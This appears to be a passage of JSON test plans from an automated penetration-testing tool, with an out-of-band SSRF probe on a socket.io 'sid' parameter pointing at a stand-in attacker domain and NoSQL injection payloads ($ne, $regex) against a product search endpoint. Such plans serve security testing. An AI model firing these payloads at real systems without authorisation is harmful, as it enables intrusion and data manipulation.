    {
      "id": "plan-004-ssrf-socketio-oob",
      "hypothesis_id": "orchestrated-ssrf-004",
      "base_url": "http://{host}",
      "method": "GET",
      "endpoint": "/socket.io/",
      "parameter": "sid",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query",
              "value": "?sid=static-test"
            }
          ],
          "description": "Baseline socket.io handshake to establish normal response and timing.",
          "encoding": "utf-8",
          "content_type": "*/*",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "?sid=example.com.xb.*.attacker-ctf.net"
            }
          ],
          "description": "Single OOB probe to attempt SSRF/OOB via sid parameter; requires operator-provided OOB domain.",
          "encoding": "utf-8",
          "content_type": "*/*",
          "header": []
        }
      ],
      "prerequisites": [
        {
          "type": "custom",
          "description": "Operator must provision OOB domain and monitoring before executing this test. Bind that domain into probe payload value.",
          "custom_logic": "use operator-provided OOB domain in query value"
        }
      ],
      "oracle_rules": [
        {
          "signal": "dns_callback",
          "condition": "oob_dns_seen_for_subdomain",
          "weight": 1.0
        },
        {
          "signal": "http_callback",
          "condition": "oob_http_seen_for_path",
          "weight": 1.0
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 1
      },
      "max_retries": 1,
      "delay_between_requests": 0.5,
      "notes": "OOB required. Run after lower-risk probes; only one request to limit noise. If needs_observation true for socket.io, ensure observation step executed before probe.",
      "tags": [
        "ssrf",
        "socket.io"
      ],
      "estimated_duration": 300
    },
    {
      "id": "plan-005-nosql-probing-search",
      "hypothesis_id": "orchestrated-nosql-005",
      "base_url": "http://{host}",
      "method": "GET",
      "endpoint": "/rest/products/search",
      "parameter": "name",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "body",
              "value": "{\"name\":\"test-product\"}"
            }
          ],
          "description": "Establish baseline search response body for comparison.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "body",
              "value": "{\"name\":\"{\\\"$ne\\\":null}\"}"
            }
          ],
          "description": "Probe with NoSQL-operator-like payload to elicit errors or altered results.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "body",
              "value": "{\"name\":{\"$regex\":\".*\"}}"
            },
            {
              "location": "body",
              "value": "{\"name\":{\"$ne\":\"nonexistent\"}}"
            }
          ],
          "description": "Further NoSQL operator payloads to attempt result manipulation if server interprets JSON as query operators.",
          "encoding": "utf-8",
          "content_type": "application/json",
          "header": []
        }
      ],
      "prerequisites": [
        {
          "type": "custom",
          "description": "No auth required; ensure benign baseline stable before probes."
        }
      ],
      "oracle_rules": [
        {
          "signal": "error_signature",
          "condition": "response_body_matches(/Mongo|syntax error|Query failed|Invalid query|E1100|Cast to ObjectId failed/i)",
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "abs(body_len_probe - body_len_baseline)/max(1,body_len_baseline) *100 >= 40",
          "threshold": {
            "body_length_delta_pct": 40.0,
            "numeric_value": 40.0
          },
          "weight": 1.0
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 8
      },
      "max_retries": 2,
      "delay_between_requests": 0.5,
      "notes": "Run after auth/enum to avoid conflation. Use lowest-risk probes first and escalate only on positive signals.",
      "tags": [
        "nosql_injection",
        "search"
      ],
      "estimated_duration": 120
    }
